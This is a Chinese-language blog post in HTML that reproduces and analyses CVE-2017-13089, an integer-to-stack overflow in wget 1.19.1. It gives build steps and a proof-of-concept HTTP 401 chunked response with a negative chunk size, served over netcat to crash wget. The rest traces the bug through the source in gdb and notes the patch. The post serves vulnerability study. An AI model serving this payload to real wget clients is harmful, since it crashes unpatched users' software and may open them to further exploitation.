<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    

    <title>
      CVE-2017-13089 wget stackoverflow | Hexo 
    </title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
      <meta name="author" content="John Doe">
    
    

    <meta name="description" content="前言参考网上的一篇文章教程，复现了一下 wget 1.19.1 组件版本的的栈溢出漏洞。漏洞的成因是由于对响应包处理不当导致的整数溢出，进而导致栈溢出。 环境准备123sudo apt-get install libneon27-gnutls-devwget https:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;wget&#x2F;wget-1.19.1.tar.">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-13089 wget stackoverflow | Hexo">
<meta property="og:url" content="http://yoursite.com/2020/03/22/CVE-2017-13089-wget-stackoverflow/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="前言参考网上的一篇文章教程，复现了一下 wget 1.19.1 组件版本的的栈溢出漏洞。漏洞的成因是由于对响应包处理不当导致的整数溢出，进而导致栈溢出。 环境准备123sudo apt-get install libneon27-gnutls-devwget https:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;wget&#x2F;wget-1.19.1.tar.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/nceqtgasof0ijqibq5tu0owu/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/jpo20try2f2boen3ua0dgs90/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/js7z81k5tom9cuk55ia1oe9q/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/4cto0ku5tmx6kc0x9hfi82c9/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/a1hthp89hof3doqpmwenkyb7/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/f3l5a8cqr0cwb582lox5e5kr/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/1axz6hkaj8s063yjch0gai1q/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/cdtronz7xywawzefvypyve2m/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/gv9dua1a93u2b9nsf675u7w4/image.png">
<meta property="og:image" content="http://static.zybuluo.com/H4l0/64p9owecgnrhknms8ej1h61z/image.png">
<meta property="article:published_time" content="2020-03-22T13:10:45.000Z">
<meta property="article:modified_time" content="2020-03-22T13:11:52.169Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="article">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://static.zybuluo.com/H4l0/nceqtgasof0ijqibq5tu0owu/image.png">
    
    
    
      <link rel="icon" type="image/x-icon" href="/favicon.png">
    
    
<link rel="stylesheet" href="/css/uno.css">

    
<link rel="stylesheet" href="/css/highlight.css">

    
<link rel="stylesheet" href="/css/archive.css">

    
<link rel="stylesheet" href="/css/china-social-icon.css">


<meta name="generator" content="Hexo 4.2.0"></head>
<body>

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    

<header class="panel-cover panel-cover--collapsed">


  <div class="panel-main">

  
    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">

        

        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hexo</a></h1>
        <hr class="panel-cover__divider" />

        

        <div class="navigation-wrapper">

          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">

              
                
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
              
                
                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
              
                
                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
              

            </ul>
          </nav>

          <!-- ----------------------------
To add a new social icon simply duplicate one of the list items from below
and change the class in the <i> tag to match the desired social network
and then add your link to the <a>. Here is a full list of social network
classes that you can use:

    icon-social-500px
    icon-social-behance
    icon-social-delicious
    icon-social-designer-news
    icon-social-deviant-art
    icon-social-digg
    icon-social-dribbble
    icon-social-facebook
    icon-social-flickr
    icon-social-forrst
    icon-social-foursquare
    icon-social-github
    icon-social-google-plus
    icon-social-hi5
    icon-social-instagram
    icon-social-lastfm
    icon-social-linkedin
    icon-social-medium
    icon-social-myspace
    icon-social-path
    icon-social-pinterest
    icon-social-rdio
    icon-social-reddit
    icon-social-skype
    icon-social-spotify
    icon-social-stack-overflow
    icon-social-steam
    icon-social-stumbleupon
    icon-social-treehouse
    icon-social-tumblr
    icon-social-twitter
    icon-social-vimeo
    icon-social-xbox
    icon-social-yelp
    icon-social-youtube
    icon-social-zerply
    icon-mail

-------------------------------->

<!-- add social info here -->



        </div>

      </div>

    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner entry">
            

<article class="post-container post-container--single">

  <header class="post-header">
    
    <h1 class="post-title">CVE-2017-13089 wget stackoverflow</h1>

    

    <div class="post-meta">
      <time datetime="2020-03-22" class="post-meta__date date">2020-03-22</time> 

      <span class="post-meta__tags tags">

          

          
             &#8226; 标签:
            <font class="tags">
              <a class="tags-link" href="/tags/article/" rel="tag">article</a>
            </font>
          

      </span>
    </div>
    
    

  </header>

  <section id="post-content" class="article-content post">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考网上的一篇文章教程，复现了一下 wget 1.19.1 组件版本的的栈溢出漏洞。漏洞的成因是由于对响应包处理不当导致的整数溢出，进而导致栈溢出。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libneon27-gnutls-dev</span><br><span class="line">wget https:&#x2F;&#x2F;ftp.gnu.org&#x2F;gnu&#x2F;wget&#x2F;wget-1.19.1.tar.gz</span><br><span class="line">tar zxvf wget-1.19.1.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd wget-1.19.1&#x2F;</span><br><span class="line">mkdir build&#x2F; &amp; .&#x2F;configure --prefix&#x3D;$PWD&#x2F;build&#x2F;</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装好的二进制文件是存放在 <code>--prefix</code> 变量值的 bin/ 目录下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br><span class="line">cd build&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/H4l0/nceqtgasof0ijqibq5tu0owu/image.png" alt="image.png-15.5kB"></p>
<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>该版本漏洞是由于 wget 组件在处理 401 状态码的数据响应包时，没有对读取的包做正负检查，导致的整数栈溢出。我们先触发一下这个漏洞。</p>
<p>1 . 建立 poc 文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  wget_sof cat poc </span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 401 Not Authorized</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;UTF-8</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">-0xFFFFF000</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p>2 . nc 监听端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  wget_sof nc -lp 12667 &lt; poc</span><br></pre></td></tr></table></figure>
<p>3 . wget 触发漏洞</p>
<p>可以看到，wget 在 12667 端口处触发了栈溢出漏洞，导致程序服务 crach：</p>
<p><img src="http://static.zybuluo.com/H4l0/jpo20try2f2boen3ua0dgs90/image.png" alt="image.png-42.8kB"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>接着对漏洞点进行静态和动态分析。</p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>前文说了漏洞点是由于对 401 数据响应包的处理不当导致的，准确的说是由于 wget 在处理响应包时，对每个包进行分块之后，错误的将一个负数与整数进行比较，得到的负数的值作为内存复制函数的 len。</p>
<p>首先搜索 <code>skip_short_body</code> 函数，进入 <code>src/http.c</code> 源代码中进行分析：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  wget-1.19.1 grep -rnl &quot;skip_short_body&quot; *                       </span><br><span class="line">build&#x2F;bin&#x2F;wget</span><br><span class="line">ChangeLog</span><br><span class="line">src&#x2F;http.c</span><br><span class="line">src&#x2F;http.o</span><br><span class="line">src&#x2F;wget</span><br></pre></td></tr></table></figure>

<p>跟踪到 <code>src/http.c</code> 文件的 3493 行，在这里会判断 wget 请求返回回来的 http 状态码，当状态码是 401（未认证）时会触发下面的 if 判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (statcode &#x3D;&#x3D; HTTP_STATUS_UNAUTHORIZED)</span><br><span class="line">  &#123;</span><br><span class="line">    &#x2F;* Authorization is required.  *&#x2F;</span><br><span class="line">    uerr_t auth_err &#x3D; RETROK;</span><br><span class="line">    bool retry;</span><br><span class="line">    if(warc_enabled)&#123;</span><br><span class="line">      ......        # 判断是否 content-type 为 WARC </span><br><span class="line">      </span><br><span class="line">    &#125;else</span><br><span class="line">      &#123;</span><br><span class="line">        &#x2F;* Since WARC is disabled, we are not interested in the response body.  *&#x2F;</span><br><span class="line">        if (keep_alive &amp;&amp; !head_only</span><br><span class="line">            &amp;&amp; skip_short_body (sock, contlen, chunked_transfer_encoding))</span><br><span class="line">          CLOSE_FINISH (sock);</span><br><span class="line">        else</span><br><span class="line">          CLOSE_INVALIDATE (sock);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>HTTP_STATUS_UNAUTHORIZED</code> 的定义：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define HTTP_STATUS_UNAUTHORIZED          401</span><br></pre></td></tr></table></figure>

<p>因为这里的 content-type 不是 warc，所以会进入 else 分支，以此判断 <code>keep_alive</code>、<code>head_only</code>，接着调用 <code>skip_short_body</code> 这个函数，这里传入了三个参数，第一个参数 sock 的描述符，后面两个参数不重要。</p>
<p>跟进函数 <code>skip_short_body</code> ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">static bool</span><br><span class="line">skip_short_body (int fd, wgint contlen, bool chunked)</span><br><span class="line">&#123;</span><br><span class="line">  enum &#123;</span><br><span class="line">    SKIP_SIZE &#x3D; 512,                &#x2F;* size of the download buffer *&#x2F;</span><br><span class="line">    SKIP_THRESHOLD &#x3D; 4096        &#x2F;* the largest size we read *&#x2F;</span><br><span class="line">  &#125;;</span><br><span class="line">  wgint remaining_chunk_size &#x3D; 0;</span><br><span class="line">  char dlbuf[SKIP_SIZE + 1];</span><br><span class="line">  dlbuf[SKIP_SIZE] &#x3D; &#39;\0&#39;;        &#x2F;* so DEBUGP can safely print it *&#x2F;</span><br><span class="line"></span><br><span class="line">  &#x2F;* If the body is too large, it makes more sense to simply close the</span><br><span class="line">     connection than to try to read the body.  *&#x2F;</span><br><span class="line">  if (contlen &gt; SKIP_THRESHOLD)</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">  while (contlen &gt; 0 || chunked)</span><br><span class="line">    &#123;</span><br><span class="line">      int ret;</span><br><span class="line">      if (chunked)</span><br><span class="line">        &#123;</span><br><span class="line">          if (remaining_chunk_size &#x3D;&#x3D; 0)</span><br><span class="line">            &#123;</span><br><span class="line">              char *line &#x3D; fd_read_line (fd);</span><br><span class="line">              char *endl;</span><br><span class="line">              if (line &#x3D;&#x3D; NULL)</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">              remaining_chunk_size &#x3D; strtol (line, &amp;endl, 16);</span><br><span class="line">              xfree (line);</span><br><span class="line"></span><br><span class="line">              if (remaining_chunk_size &#x3D;&#x3D; 0)</span><br><span class="line">                &#123;</span><br><span class="line">                  line &#x3D; fd_read_line (fd);</span><br><span class="line">                  xfree (line);</span><br><span class="line">                  break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          contlen &#x3D; MIN (remaining_chunk_size, SKIP_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      DEBUGP ((&quot;Skipping %s bytes of body: [&quot;, number_to_static_string (contlen)));</span><br><span class="line"></span><br><span class="line">      ret &#x3D; fd_read (fd, dlbuf, MIN (contlen, SKIP_SIZE), -1);</span><br></pre></td></tr></table></figure>

<p>首先函数通过 sock 获取到 line 的指针： <code>char *line = fd_read_line (fd);</code>，<strong>也就是 http 响应包的响应体的指针</strong>。</p>
<p>接着调用 <code>strtol</code> 函数，将 line 变量指向的值转换为整数值（<code>remaining_chunk_size</code> 变量），接着通过 <code>MIN (remaining_chunk_size, SKIP_SIZE);</code> 得到真正的响应体的长度 contlen。</p>
<ul>
<li>MIN 的定义，取长度小的作为 contlen 的值：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># define MIN(a,b) ((a) &lt; (b) ? (a) : (b))</span><br></pre></td></tr></table></figure>

<p>之后调用了 <code>fd_read</code> 函数，将响应体的内容复制到栈中，长度即为 contlen 变量的值。</p>
<p><code>fd_read</code> 函数封装了 <code>sock_read</code> 函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">fd_read (int fd, char *buf, int bufsize, double timeout)</span><br><span class="line">&#123;</span><br><span class="line">  struct transport_info *info;</span><br><span class="line">  LAZY_RETRIEVE_INFO (info);</span><br><span class="line">  if (!poll_internal (fd, info, WAIT_FOR_READ, timeout))</span><br><span class="line">    return -1;</span><br><span class="line">  if (info &amp;&amp; info-&gt;imp-&gt;reader)</span><br><span class="line">    return info-&gt;imp-&gt;reader (fd, buf, bufsize, info-&gt;ctx);</span><br><span class="line">  else</span><br><span class="line">    return sock_read (fd, buf, bufsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sock_read</code> 函数调用了 <code>read</code> 函数，在这里触发了栈溢出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">sock_read (int fd, char *buf, int bufsize)</span><br><span class="line">&#123;</span><br><span class="line">  int res;</span><br><span class="line">  do</span><br><span class="line">    res &#x3D; read (fd, buf, bufsize);</span><br><span class="line">  while (res &#x3D;&#x3D; -1 &amp;&amp; errno &#x3D;&#x3D; EINTR);</span><br><span class="line">  return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>使用 gdb 进行动态调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb .&#x2F;wget</span><br><span class="line">set args 127.0.0.1:12667</span><br><span class="line">b skip_short_body</span><br></pre></td></tr></table></figure>

<p>将断点下在 <code>skip_short_body</code> 函数入口，在执行完 <code>fd_read_line</code> 函数后，观察寄存器，返回值 line 的值为 <code>-0xFFFFF000</code> 的指针：</p>
<p><img src="http://static.zybuluo.com/H4l0/js7z81k5tom9cuk55ia1oe9q/image.png" alt="image.png-247kB"></p>
<p>往下，接着会调用 <code>strtol</code> 函数，第一个为 line 的值，第二个参数为栈上的变量，第三个参数为长度：</p>
<p><img src="http://static.zybuluo.com/H4l0/4cto0ku5tmx6kc0x9hfi82c9/image.png" alt="image.png-38.3kB"></p>
<p>执行完 <code>strtol</code> 函数之后，会将返回值赋值给 <code>remaining_chunk_size</code> 变量，此时这个变量的值为 <code>0xffffffff00001000</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i reg rax</span><br><span class="line">rax            0xffffffff00001000       -4294963200</span><br></pre></td></tr></table></figure>

<p>通过代码 <code>contlen = MIN (remaining_chunk_size, SKIP_SIZE);</code> 进行比较，得到的 <code>contlen</code> 变量的值为 0x1000。</p>
<p>而 <code>SKIP_SIZE</code> 的定义：</p>
<p><img src="http://static.zybuluo.com/H4l0/a1hthp89hof3doqpmwenkyb7/image.png" alt="image.png-42.5kB"></p>
<ul>
<li><strong>这里将一个负数与整数相比较，返回的值就是 0x1000。</strong></li>
</ul>
<p>接着调用到 <code>fd_read</code> 函数，这个函数的第三个参数就是 contlen 的值，大小为 0x1000。</p>
<p> <img src="http://static.zybuluo.com/H4l0/f3l5a8cqr0cwb582lox5e5kr/image.png" alt="image.png-46.3kB"></p>
<p>跟进函数，<code>fd_read</code> 里面封装了 <code>sock_read</code> 函数：</p>
<p><img src="http://static.zybuluo.com/H4l0/1axz6hkaj8s063yjch0gai1q/image.png" alt="image.png-47.9kB"></p>
<p>跟进之后发现，这个函数里调用了 read 函数，将 sock 通道里的内容（也就是 AAAA…）复制到栈空间上：</p>
<p><img src="http://static.zybuluo.com/H4l0/cdtronz7xywawzefvypyve2m/image.png" alt="image.png-281.9kB"></p>
<p>因为这个值太大，导致了栈溢出。<strong>填充后不会使得当前 <code>fd_read</code> 函数崩溃，而会溢出到了 <code>skip_short_body</code>  这个函数的栈空间，覆盖了栈的返回地址</strong>，导致程序崩溃：</p>
<p><img src="http://static.zybuluo.com/H4l0/gv9dua1a93u2b9nsf675u7w4/image.png" alt="image.png-10.8kB"></p>
<h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p>更新的补丁将 <code>strtol</code> 函数的返回值 <code>remaining_chunk_size</code> 变量的值进行是否为负数的判断，如果是负数的话就之后 <code>return False</code> 从而防止整数的溢出。</p>
<p><img src="http://static.zybuluo.com/H4l0/64p9owecgnrhknms8ej1h61z/image.png" alt="image.png-77.6kB"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/3rBfUnRiFoe-0w2C9JqwZw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3rBfUnRiFoe-0w2C9JqwZw</a></p>

  </section>

  <section class="post-comments">

    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
    
</section>


</article>


            <footer class="footer">

    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno" target="_blank" rel="noopener">Huno</a></span>
    
</footer>
        </div>
    </div>

    <!-- js files -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/scale.fix.js"></script>
    

    

    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
            MathJax.Hub.Config({ 
                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
            });
        });
    </script>


    

    <script src="/js/jquery.min.js"></script>
    <script src="/js/awesome-toc.min.js"></script>
    <script>
        $(document).ready(function(){
            $.awesome_toc({
                overlay: true,
                contentId: "post-content",
            });
        });
    </script>


    
    
    <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->

</body>
</html>
